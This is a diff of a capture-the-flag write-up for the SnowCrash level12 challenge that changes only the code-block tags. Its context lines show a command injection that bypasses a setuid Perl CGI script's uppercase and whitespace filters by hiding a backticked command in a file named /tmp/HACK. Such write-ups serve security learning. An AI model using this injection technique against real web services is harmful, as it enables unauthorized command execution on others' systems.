@@ -10,7 +10,7 @@
 - The folder contains a perl script named `level12.pl` and owned by `flag12`.
 - The SETUID and SETGID bits are set, allowing it to be executed with `flag12` privileges.
 
-```sh
+```console
 level12@SnowCrash:~$ ls -al
 total 16
 dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
@@ -30,7 +30,7 @@ Content-type: text/html
 - A CGI perl script is effectively active on port 4646, executing the script `/var/www/level12.pl`.
 - That script is identical to the one in our home folder.
 
-```sh
+```console
 level12@SnowCrash:~$ cat /etc/apache2/sites-enabled/level12.conf
 <VirtualHost \*:4646>
 DocumentRoot /var/www/level12/
@@ -55,7 +55,7 @@ drwxr-xr-x 1 root root 100 Nov 2 10:12 ..
 
 - The script takes two arguments x and y as parmeters and prints either a dot or two dots according to those parameters.
 
-```sh
+```console
 level12@SnowCrash:~$ curl 'localhost:4646?x=hello&y=coucou'
 .level12@SnowCrash:~$
 
@@ -74,7 +74,7 @@ level12@SnowCrash:~$ curl 'localhost:4646?x=hello&y=coucou'
 - Unfortunatly, the `$xx` variable will first be wrecked up by two regular expressions, switching all letters to upercase and removing the first whitespace and everything that follows. A command like `getflag > /tmp/flag` won't go through.
 - It is nevertheless possible to bypass those protections by embedding the command into a file with an upercase name like `HACK`.
 
-```sh
+```console
 level12@SnowCrash:~$ echo '`getflag > /tmp/flag`' > /tmp/HACK
 level12@SnowCrash:~$ chmod 777 /tmp/HACK
 level12@SnowCrash:~$ touch /tmp/flag
@@ -84,7 +84,7 @@ level12@SnowCrash:~$ cat /tmp/flag
 
 > Notice that we can't use `level12`'s' home for the `flag` file as acls forbid user and group `flag12` to write in that directory.
 
-```sh
+```console
 level12@SnowCrash:~$ getfacl /home/user/level12/
 getfacl: Removing leading '/' from absolute path names
 # file: home/user/level12/
